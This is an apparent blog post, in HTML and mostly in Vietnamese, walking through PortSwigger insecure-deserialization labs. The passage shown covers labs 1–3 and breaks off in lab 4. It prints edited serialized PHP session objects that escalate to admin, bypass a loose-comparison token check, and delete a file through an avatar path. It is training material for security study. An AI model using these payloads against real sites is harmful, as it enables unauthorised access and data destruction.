@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>PortSwigger - Insecure Deserialization - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/">
+  <meta property="og:site_name" content="g03m0n">
+  <meta property="og:title" content="PortSwigger - Insecure Deserialization">
+  <meta property="og:description" content="Thông thường cấu trúc của Serialize Data có dạng: O: strlen(object name): object name: object size: {... elements...}
+1. Modifying serialized objects Description This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos’s account. You can log in to your own account using the5 following credentials: wiener:peter">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-20T08:29:01+08:00">
+    <meta property="article:modified_time" content="2023-12-20T08:29:01+08:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Lab">
+    <meta property="og:image" content="https://g03m0n.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://g03m0n.github.io/logo.png">
+  <meta name="twitter:title" content="PortSwigger - Insecure Deserialization">
+  <meta name="twitter:description" content="Thông thường cấu trúc của Serialize Data có dạng: O: strlen(object name): object name: object size: {... elements...}
+1. Modifying serialized objects Description This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos’s account. You can log in to your own account using the5 following credentials: wiener:peter">
+<meta name="application-name" content="g03m0n">
+<meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/" /><link rel="prev" href="https://g03m0n.github.io/posts/cve-2022-33891/" /><link rel="next" href="https://g03m0n.github.io/posts/cookiectf-baby-sqlite-with-filter/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PortSwigger - Insecure Deserialization",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/g03m0n.github.io\/posts\/portswigger-insecure-deserialization\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "ctf, lab","wordcount":  1565 ,
+        "url": "https:\/\/g03m0n.github.io\/posts\/portswigger-insecure-deserialization\/","datePublished": "2023-12-20T08:29:01+08:00","dateModified": "2023-12-20T08:29:01+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "g03m0n"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PortSwigger - Insecure Deserialization</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/portswigger/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>PortSwigger</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-20">2023-12-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1565 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1--modifying-serialized-objects">1.  Modifying serialized objects</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#exploitaion">Exploitaion</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-modifying-serialized-data-types">2. Modifying serialized data types</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#exploitaion-1">Exploitaion</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-using-application-functionality-to-exploit-insecure-deserialization">3. Using application functionality to exploit insecure deserialization</a>
+      <ul>
+        <li><a href="#description-2">Description</a></li>
+        <li><a href="#exploitaion-2">Exploitaion</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</a>
+      <ul>
+        <li><a href="#description-3">Description</a></li>
+        <li><a href="#exploitaion-3">Exploitaion</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</a>
+      <ul>
+        <li><a href="#description-4">Description</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</a>
+      <ul>
+        <li><a href="#description-5">Description</a></li>
+        <li><a href="#exploitation-1">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</a>
+      <ul>
+        <li><a href="#description-6">Description</a></li>
+        <li><a href="#exploitation-2">Exploitation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><blockquote>
+<p>Thông thường cấu trúc của <code>Serialize Data</code> có dạng:
+<code>O: strlen(object name): object name: object size: {... elements...}</code></p>
+</blockquote>
+<h2 id="1--modifying-serialized-objects">1.  Modifying serialized objects</h2>
+<h3 id="description">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&rsquo;s account.
+You can log in to your own account using the5 following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion">Exploitaion</h3>
+<p>Challenge này yêu cầu ta thay đổi thuộc tính trên serialized objects để leo quyền lên admin.</p>
+<p>Đăng nhập bằng tài khoản <code>wiener:peter</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/b827b507-fc03-40fd-9620-d5248f64884e"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/b827b507-fc03-40fd-9620-d5248f64884e, https://github.com/g03m0n/pics/assets/130943529/b827b507-fc03-40fd-9620-d5248f64884e 1.5x, https://github.com/g03m0n/pics/assets/130943529/b827b507-fc03-40fd-9620-d5248f64884e 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/b827b507-fc03-40fd-9620-d5248f64884e"
+        title="image" /></p>
+<p>Ta thấy <code>session cookie</code> là một object <code>User</code> sau khi được serialized và base64-encode. Để ý object <code>User</code> này có thuộc tính <code>admin</code> hiện có giá trị boolean <code>0</code> tức là <code>false</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/72f406e2-3918-498a-84eb-9466d06b5330"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/72f406e2-3918-498a-84eb-9466d06b5330, https://github.com/g03m0n/pics/assets/130943529/72f406e2-3918-498a-84eb-9466d06b5330 1.5x, https://github.com/g03m0n/pics/assets/130943529/72f406e2-3918-498a-84eb-9466d06b5330 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/72f406e2-3918-498a-84eb-9466d06b5330"
+        title="image" /></p>
+<p>Vì user này không phải <code>admin</code> → không vào được trang <code>/admin</code>.
+=&gt; Ta thử thay đổi giá trị boolean ở serialized session cookie thành <code>1</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/f4eb53d9-1855-4dcd-87a6-62d7674763c0"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/f4eb53d9-1855-4dcd-87a6-62d7674763c0, https://github.com/g03m0n/pics/assets/130943529/f4eb53d9-1855-4dcd-87a6-62d7674763c0 1.5x, https://github.com/g03m0n/pics/assets/130943529/f4eb53d9-1855-4dcd-87a6-62d7674763c0 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/f4eb53d9-1855-4dcd-87a6-62d7674763c0"
+        title="image" /></p>
+<p>End-code base64</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/8fea54f4-595a-4769-81d5-41da3b5272fe"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/8fea54f4-595a-4769-81d5-41da3b5272fe, https://github.com/g03m0n/pics/assets/130943529/8fea54f4-595a-4769-81d5-41da3b5272fe 1.5x, https://github.com/g03m0n/pics/assets/130943529/8fea54f4-595a-4769-81d5-41da3b5272fe 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/8fea54f4-595a-4769-81d5-41da3b5272fe"
+        title="image" /></p>
+<p>Edit cookie của trang web và load lại trang:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/f6b87996-c330-4a0f-986e-8cd2b7f83a67"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/f6b87996-c330-4a0f-986e-8cd2b7f83a67, https://github.com/g03m0n/pics/assets/130943529/f6b87996-c330-4a0f-986e-8cd2b7f83a67 1.5x, https://github.com/g03m0n/pics/assets/130943529/f6b87996-c330-4a0f-986e-8cd2b7f83a67 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/f6b87996-c330-4a0f-986e-8cd2b7f83a67"
+        title="image" /></p>
+<p>=&gt; <code>User</code> đã đăng nhập được vào trang <code>/admin</code>
+Tiến hành xóa user <code>Carlos</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/3b5478dc-c6b6-4420-9e8f-56885b17e8ca"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/3b5478dc-c6b6-4420-9e8f-56885b17e8ca, https://github.com/g03m0n/pics/assets/130943529/3b5478dc-c6b6-4420-9e8f-56885b17e8ca 1.5x, https://github.com/g03m0n/pics/assets/130943529/3b5478dc-c6b6-4420-9e8f-56885b17e8ca 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/3b5478dc-c6b6-4420-9e8f-56885b17e8ca"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/30d3a1c7-1226-481a-a906-e21a3d26f373"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/30d3a1c7-1226-481a-a906-e21a3d26f373, https://github.com/g03m0n/pics/assets/130943529/30d3a1c7-1226-481a-a906-e21a3d26f373 1.5x, https://github.com/g03m0n/pics/assets/130943529/30d3a1c7-1226-481a-a906-e21a3d26f373 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/30d3a1c7-1226-481a-a906-e21a3d26f373"
+        title="image" /></p>
+<h2 id="2-modifying-serialized-data-types">2. Modifying serialized data types</h2>
+<h3 id="description-1">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion-1">Exploitaion</h3>
+<p>Tương tự lab 1, session cookie cũng được serialize từ <code>User</code> object</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/91c5f55b-8f0b-4c2c-9abd-244f07d19240"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/91c5f55b-8f0b-4c2c-9abd-244f07d19240, https://github.com/g03m0n/pics/assets/130943529/91c5f55b-8f0b-4c2c-9abd-244f07d19240 1.5x, https://github.com/g03m0n/pics/assets/130943529/91c5f55b-8f0b-4c2c-9abd-244f07d19240 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/91c5f55b-8f0b-4c2c-9abd-244f07d19240"
+        title="image" /></p>
+<p>Lần này ứng dụng authenticate user thông qua thuộc tính access_token là chuỗi kí tự dài 32 kí tự.</p>
+<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;s: 32: &#34;t2blplwd06k5lr3coyxnjzy7ne355ge5&#34;;}
+</code></pre><p>Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator <code>==</code> để authenticate như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_SESSION)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user[<span style="color:#e6db74">&#39;access_token&#39;</span>] <span style="color:#f92672">==</span> $access_token) {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Authenticate successfully
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>Như vậy ta sẽ bypass bằng cách chỉnh <code>access_token</code> về số nguyên 0 → bypass được <code>==</code> vì 0 <code>==</code> <code>string</code> sẽ trả về <code>true</code>. Serialized object sau khi chỉnh như sau:</p>
+<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;i: 0;}
+</code></pre><p>Endcode base64 và edit cookie</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/9dd2adc8-a887-4379-a46d-9e4a9841de4b"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9dd2adc8-a887-4379-a46d-9e4a9841de4b, https://github.com/g03m0n/pics/assets/130943529/9dd2adc8-a887-4379-a46d-9e4a9841de4b 1.5x, https://github.com/g03m0n/pics/assets/130943529/9dd2adc8-a887-4379-a46d-9e4a9841de4b 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/9dd2adc8-a887-4379-a46d-9e4a9841de4b"
+        title="image" /></p>
+<p>Đăng nhập vào <code>admin</code> panel thành công và tiến hành xóa user <code>Carlos</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/0d52a502-8ec8-437e-a515-4da0f02760fc"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0d52a502-8ec8-437e-a515-4da0f02760fc, https://github.com/g03m0n/pics/assets/130943529/0d52a502-8ec8-437e-a515-4da0f02760fc 1.5x, https://github.com/g03m0n/pics/assets/130943529/0d52a502-8ec8-437e-a515-4da0f02760fc 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/0d52a502-8ec8-437e-a515-4da0f02760fc"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/7326216d-7d53-453c-aa7c-a83128e978ae"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7326216d-7d53-453c-aa7c-a83128e978ae, https://github.com/g03m0n/pics/assets/130943529/7326216d-7d53-453c-aa7c-a83128e978ae 1.5x, https://github.com/g03m0n/pics/assets/130943529/7326216d-7d53-453c-aa7c-a83128e978ae 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/7326216d-7d53-453c-aa7c-a83128e978ae"
+        title="image" /></p>
+<h2 id="3-using-application-functionality-to-exploit-insecure-deserialization">3. Using application functionality to exploit insecure deserialization</h2>
+<h3 id="description-2">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter
+You also have access to a backup account: gregg:rosebud</p>
+</blockquote>
+<h3 id="exploitaion-2">Exploitaion</h3>
+<p>Tương tự 2 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/40fa58ea-bf6b-43cf-ad63-1b6b456b63c5"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/40fa58ea-bf6b-43cf-ad63-1b6b456b63c5, https://github.com/g03m0n/pics/assets/130943529/40fa58ea-bf6b-43cf-ad63-1b6b456b63c5 1.5x, https://github.com/g03m0n/pics/assets/130943529/40fa58ea-bf6b-43cf-ad63-1b6b456b63c5 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/40fa58ea-bf6b-43cf-ad63-1b6b456b63c5"
+        title="image" /></p>
+<p>Lần này ứng dụng có thêm thuộc tính <code>avatar_link</code>. Mà ứng dụng này có chức năng <code>Delete account</code> =&gt; Khi ấn vào nút <code>Delete account</code> thì ứng dụng sẽ xóa cả <code>avatar</code> của người dùng.</p>
+<p>Nếu ta thay đổi đường dẫn tại thuộc tính <code>avatar_link</code> thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi <code>Delete account</code>.</p>
+<p>Chỉnh sửa <code>avatar_link</code> thành <code>/home/carlos/morale.txt</code> để tiến hành xóa file.</p>
+<pre tabindex="0"><code>O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:6:&#34;wiener&#34;;s:12:&#34;access_token&#34;;s:32:&#34;bqp5e5wpdhhaz3rt0knb1u6uowozl5se&#34;;s:11:&#34;avatar_link&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
+</code></pre><p>Endcode base64 và Edit cookie.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/0b5cfcbc-4f23-427f-9815-5c4f695648bc"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0b5cfcbc-4f23-427f-9815-5c4f695648bc, https://github.com/g03m0n/pics/assets/130943529/0b5cfcbc-4f23-427f-9815-5c4f695648bc 1.5x, https://github.com/g03m0n/pics/assets/130943529/0b5cfcbc-4f23-427f-9815-5c4f695648bc 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/0b5cfcbc-4f23-427f-9815-5c4f695648bc"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/8d0f0295-13ff-4615-8116-963e7e76e512"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/8d0f0295-13ff-4615-8116-963e7e76e512, https://github.com/g03m0n/pics/assets/130943529/8d0f0295-13ff-4615-8116-963e7e76e512 1.5x, https://github.com/g03m0n/pics/assets/130943529/8d0f0295-13ff-4615-8116-963e7e76e512 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/8d0f0295-13ff-4615-8116-963e7e76e512"
+        title="image" /></p>
+<p>Load lại trang và Solved.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/9b72bd5c-a9ff-4756-a3d1-4ef4bca00242"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9b72bd5c-a9ff-4756-a3d1-4ef4bca00242, https://github.com/g03m0n/pics/assets/130943529/9b72bd5c-a9ff-4756-a3d1-4ef4bca00242 1.5x, https://github.com/g03m0n/pics/assets/130943529/9b72bd5c-a9ff-4756-a3d1-4ef4bca00242 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/9b72bd5c-a9ff-4756-a3d1-4ef4bca00242"
+        title="image" /></p>
+<h2 id="4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</h2>
+<h3 id="description-3">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion-3">Exploitaion</h3>
+<p>Tương tự 3 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
+<p>Khi ấn vào <code>view-source</code> ta thấy một đường dẫn:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/e87aaa74-531c-4b77-89c2-165ad430b3da"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/e87aaa74-531c-4b77-89c2-165ad430b3da, https://github.com/g03m0n/pics/assets/130943529/e87aaa74-531c-4b77-89c2-165ad430b3da 1.5x, https://github.com/g03m0n/pics/assets/130943529/e87aaa74-531c-4b77-89c2-165ad430b3da 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/e87aaa74-531c-4b77-89c2-165ad430b3da"
+        title="image" /></p>
+<p>Kiểm tra thử đường dẫn xem có đọc được source code không:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/508df3db-1b63-4c04-9e29-1f6b1d8a5ae3"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/508df3db-1b63-4c04-9e29-1f6b1d8a5ae3, https://github.com/g03m0n/pics/assets/130943529/508df3db-1b63-4c04-9e29-1f6b1d8a5ae3 1.5x, https://github.com/g03m0n/pics/assets/130943529/508df3db-1b63-4c04-9e29-1f6b1d8a5ae3 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/508df3db-1b63-4c04-9e29-1f6b1d8a5ae3"
+        title="image" /></p>
+<p>Không có gì phản hồi. Ta thử thêm dấu <code>~</code> vào cuối đường dẫn, ta xem được mã nguồn file <code>/libs/CustomTemplate.php</code>.</p>
+<p>Mã nguồn file <code>/libs/CustomTemplate.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomTemplate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $template_file_path;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $lock_file_path;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($template_file_path) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span> <span style="color:#f92672">=</span> $template_file_path;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span> <span style="color:#f92672">=</span> $template_file_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.lock&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isTemplateLocked</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTemplate</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);
